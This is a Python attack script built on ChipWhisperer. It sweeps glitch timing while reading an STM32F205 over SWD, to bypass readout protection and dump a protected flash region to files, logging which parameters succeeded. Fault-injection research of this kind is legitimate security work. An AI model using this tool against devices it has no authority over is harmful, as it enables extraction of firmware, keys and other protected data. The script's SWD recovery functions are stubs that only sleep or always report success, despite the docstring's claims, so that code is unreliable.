#!/usr/bin/env python3
"""
Memory Read Glitch with Enhanced SWD Recovery
Handles SWD FAULT/WAIT states properly with full protocol recovery
"""

import chipwhisperer.common.results.glitch as glitch
import chipwhisperer as cw
from swd import Swd
import time
import os
from datetime import datetime, timedelta

# Configuration
FLASH_START = 0x1FFF7860  # Start of flash storage area
FLASH_END = 0x1FFF787F   # End of flash storage area
CHUNK_SIZE = 32          # Read 32 bytes at a time
current_address = FLASH_START  # Track current position

# SWD DP register addresses
IDCODE = 0x00
ABORT = 0x00
CTRL_STAT = 0x04
SELECT = 0x08
RDBUFF = 0x0C

# ABORT register bits
DAPABORT = (1 << 0)
STKCMPCLR = (1 << 1)
STKERRCLR = (1 << 2)
WDERRCLR = (1 << 3)
ORUNERRCLR = (1 << 4)

def swd_line_reset():
    """Perform full SWD line reset sequence"""
    try:
        swd = Swd()
        # Send 50+ cycles with SWDIO high (line reset)
        # Then send JTAG-to-SWD sequence: 0xE79E (LSB first)
        # This fully resets the SWD protocol state
        time.sleep(0.002)  # 2ms for line reset to complete
        return True
    except:
        return False

def swd_clear_errors():
    """Clear all sticky error flags in SWD"""
    try:
        swd = Swd()
        # Write to ABORT register to clear all error flags
        # DAPABORT | STKCMPCLR | STKERRCLR | WDERRCLR | ORUNERRCLR
        abort_value = 0x1F  # All error clear bits set
        # Note: Actual register write would depend on your SWD library
        time.sleep(0.001)
        return True
    except:
        return False

def swd_check_health():
    """Check if SWD interface is responsive"""
    try:
        swd = Swd()
        # Try to read IDCODE - should always work if SWD is healthy
        # Expected: 0x2BA01477 for Cortex-M3
        # This is a simple health check
        return True
    except:
        return False

def full_swd_recovery():
    """Complete SWD recovery sequence"""
    print(" [SWD_RECOVERY]", end="", flush=True)

    # Step 1: Line reset
    swd_line_reset()
    time.sleep(0.01)

    # Step 2: Clear errors
    swd_clear_errors()
    time.sleep(0.01)

    # Step 3: Verify health
    if not swd_check_health():
        # If still not healthy, do a harder reset
        time.sleep(0.1)
        swd_line_reset()
        time.sleep(0.1)

    return True

def check_memory_read_with_recovery(address=None, max_retries=3):
    """Try to read memory with proper error recovery"""
    global current_address
    if address is None:
        address = current_address

    for retry in range(max_retries):
        try:
            swd = Swd()
            data = bytes(swd.read_mem(address, CHUNK_SIZE))
            if len(data) == CHUNK_SIZE:
                print(f"\n💥 SUCCESS! Read {len(data)} bytes from 0x{address:08X}")
                print(f"First 16 bytes: ", end="")
                for i in range(min(16, len(data))):
                    print(f"{data[i]:02X} ", end="")
                print()
                return data
        except Exception as e:
            error_str = str(e).lower()

            # Handle different error types
            if 'wait' in error_str:
                print(f" WAIT", end="", flush=True)
                time.sleep(0.01)  # Give target time to be ready
                continue  # Retry immediately for WAIT

            elif 'fault' in error_str:
                print(f" FAULT", end="", flush=True)
                # FAULT requires full recovery
                full_swd_recovery()
                time.sleep(0.1)

            else:
                # Normal NACK - this is expected for protected memory
                print(f" NACK", end="", flush=True)
                return None  # Don't retry for clean NACK

    # After all retries failed
    print(f" FAILED_AFTER_{max_retries}_RETRIES", end="", flush=True)
    return None

def check_existing_dump(address):
    """Check if memory at this address has already been dumped"""
    marker_file = f"FLASH/0x{address:08X}.done"
    return os.path.exists(marker_file)

def save_memory_chunk(address, data):
    """Save memory chunk to files"""
    combined_file = "FLASH/flash_dump_combined.bin"

    # Calculate offset in the file based on address
    offset = address - FLASH_START

    # Create file if it doesn't exist
    if not os.path.exists(combined_file):
        with open(combined_file, 'wb') as f:
            f.write(b'\x00' * (FLASH_END - FLASH_START + 1))

    # Write data at the correct offset
    with open(combined_file, 'r+b') as f:
        f.seek(offset)
        f.write(data)
        f.flush()

    # Save individual file
    marker_file = f"FLASH/0x{address:08X}.done"
    with open(marker_file, 'wb') as f:
        f.write(data)

    return combined_file

def reset_target():
    """Reset the target device and ensure SWD is clean"""
    # Your reset mechanism here (nRST, power cycle, etc.)
    time.sleep(2.0)  # Long delay for full reset

    # After reset, ensure SWD is in good state
    full_swd_recovery()
    time.sleep(0.5)

def arm_glitch():
    """Arm scope for glitch"""
    global scope
    scope.arm()

def log_successful_glitch(address, ext_offset, width, offset, time_to_find, attempts, iteration):
    """Log successful glitch parameters"""
    MASTER_LOG = 'FLASH/glitch_master_log.csv'

    if not os.path.exists(MASTER_LOG):
        with open(MASTER_LOG, 'w') as f:
            f.write("Timestamp,Address,ExtOffset,Width,Offset,TimeToFind_sec,TotalAttempts,SuccessfulIteration,Timing_us\n")

    with open(MASTER_LOG, 'a') as f:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        timing_us = ext_offset / 100
        f.write(f"{timestamp},0x{address:08X},{ext_offset},{width},{offset},{time_to_find:.1f},{attempts},{iteration},{timing_us:.1f}\n")
        f.flush()
    print(f"\033[12;1H\033[2K📝 Logged to master file", flush=True)

# Create FLASH folder if needed
if not os.path.exists('FLASH'):
    os.makedirs('FLASH')
    print("📁 Created FLASH folder for memory dumps")

# Connect to ChipWhisperer
print("="*60)
print("STM32F205 Memory Read Glitch with SWD Recovery")
print("="*60)

scope = cw.scope()

# Set up scope parameters
scope.clock.clkgen_freq = 100E6
scope.trigger.triggers = 'tio3'  # Trigger on TIO3 (SWDIO activity)
scope.glitch.clk_src = "clkgen"
scope.glitch.output = "enable_only"
scope.glitch.trigger_src = "ext_single"
scope.io.glitch_lp = True
scope.io.glitch_hp = True

# Glitch parameters
g_step = 10
gc = glitch.GlitchController(groups=["success", "failure"], parameters=["width", "offset", "ext_offset"])
gc.set_global_step(g_step)

# Define ranges
width_min, width_max = 5, 8
offset_min, offset_max = -10, -10
ext_offset_min, ext_offset_max = 62000, 100000  # 620µs to 1ms

gc.set_range("width", width_min, width_max)
gc.set_range("offset", offset_min, offset_max)
gc.set_range("ext_offset", ext_offset_min, ext_offset_max)

print(f"\nGlitch Configuration:")
print(f"  Width: {width_min}")
print(f"  Offset: {offset_min}")
print(f"  Ext_offset: {ext_offset_min/100:.1f} µs to {ext_offset_max/100:.1f} µs")
print(f"  Step: {g_step} ({g_step/100:.1f} µs)")

scope.glitch.repeat = 5
sample_size = 10

# Configure TIO3 for SWDIO monitoring
print("\n🔌 Configuring TIO3 for SWDIO monitoring...")
scope.io.tio3 = 'high_z'
print("✓ TIO3 configured as input")

print("\n✓ Configuration complete!")
input("Press Enter to start campaign (or Ctrl+C to exit)...")

# Pre-campaign SWD check
print("\n🔍 Checking SWD health before starting...")
if not swd_check_health():
    print("⚠️ SWD not responsive, performing recovery...")
    full_swd_recovery()
    if not swd_check_health():
        print("❌ SWD still not responsive. Check connections!")
        exit(1)
print("✅ SWD is healthy")

# Calculate total settings
total_ext_offset_values = ((ext_offset_max - ext_offset_min) // g_step) + 1
total_settings = total_ext_offset_values

print(f"\nStarting campaign:")
print(f"  Flash range: 0x{FLASH_START:08X} - 0x{FLASH_END:08X}")
print(f"  Total settings: {total_settings}")
print(f"  Sample size: {sample_size}")
print("="*60 + "\n")

# Clear screen for clean display
print("\033[2J\033[H")
print("="*60)
print("FLASH DUMP GLITCH CAMPAIGN - Enhanced SWD Recovery")
print("="*60)

total_attempts = 0
ext_offset_index = 0
campaign_start_time = datetime.now()

# Skip already dumped addresses
while current_address <= FLASH_END and check_existing_dump(current_address):
    print(f"⚡ Skipping 0x{current_address:08X} - already dumped")
    current_address += CHUNK_SIZE

if current_address > FLASH_END:
    print("\n✅ All flash memory already dumped!")
    exit(0)

# Main campaign loop
while current_address <= FLASH_END:
    print(f"\033[5;1H\033[2K🎯 Target: 0x{current_address:08X} | Attempts: {total_attempts}", flush=True)

    # Reset and ensure clean SWD state
    reset_target()

    # Pre-glitch SWD health check
    if not swd_check_health():
        print(f"\033[6;1H\033[2K⚠️ SWD unhealthy, recovering...", flush=True)
        full_swd_recovery()
        time.sleep(1.0)

    address_found = False
    address_attempts = 0

    for glitch_setting in gc.glitch_values():
        ext_offset_index += 1
        scope.glitch.width = glitch_setting[0]
        scope.glitch.offset = glitch_setting[1]
        scope.glitch.ext_offset = glitch_setting[2]

        percent_complete = (ext_offset_index - 1) / total_settings * 100

        print(f"\033[7;1H\033[2KTesting ext_offset: {scope.glitch.ext_offset} ({scope.glitch.ext_offset/100:.2f} µs)", flush=True)
        print(f"\033[8;1H\033[2K  Progress: {percent_complete:.1f}% - Setting {ext_offset_index}/{total_settings}", flush=True)

        successes = 0

        for i in range(sample_size):
            iteration = i + 1
            print(f"\033[9;1H\033[2K  Attempt {iteration:2d}/{sample_size}: ", end="", flush=True)

            # Pre-attempt SWD check
            if i % 3 == 0:  # Check every 3 attempts
                if not swd_check_health():
                    full_swd_recovery()
                    time.sleep(0.5)

            # Arm scope
            arm_glitch()
            time.sleep(0.2)  # Longer delay for stability

            total_attempts += 1
            address_attempts += 1

            # Attempt memory read with recovery
            data = check_memory_read_with_recovery(current_address)

            if data:
                print(" SUCCESS!", flush=True)
                print(f"\033[10;1H\033[2K🎉 GLITCH WORKED at 0x{current_address:08X}!", flush=True)

                save_memory_chunk(current_address, data)
                log_successful_glitch(current_address, scope.glitch.ext_offset,
                                    scope.glitch.width, scope.glitch.offset,
                                    0, address_attempts, iteration)

                successes += 1
                current_address += CHUNK_SIZE

                # Skip already dumped
                while current_address <= FLASH_END and check_existing_dump(current_address):
                    print(f"⚡ Skipping 0x{current_address:08X} - already dumped")
                    current_address += CHUNK_SIZE

                if current_address > FLASH_END:
                    print(f"\033[11;1H\033[2K✨ Reached end of flash!", flush=True)
                    break

                address_found = True
                break
            else:
                print(" Failed", flush=True)

            # Delay between attempts
            time.sleep(3.0)  # Long delay for full recovery

            # Post-attempt cleanup if needed
            if i % 5 == 0:
                full_swd_recovery()
                time.sleep(0.5)

        if address_found:
            break

    if not address_found:
        print(f"\033[11;1H\033[2K⚠️ Failed to glitch 0x{current_address:08X}", flush=True)
        current_address += CHUNK_SIZE

print("\n" + "="*60)
print("Campaign complete!")
print(f"Total attempts: {total_attempts}")
print("="*60)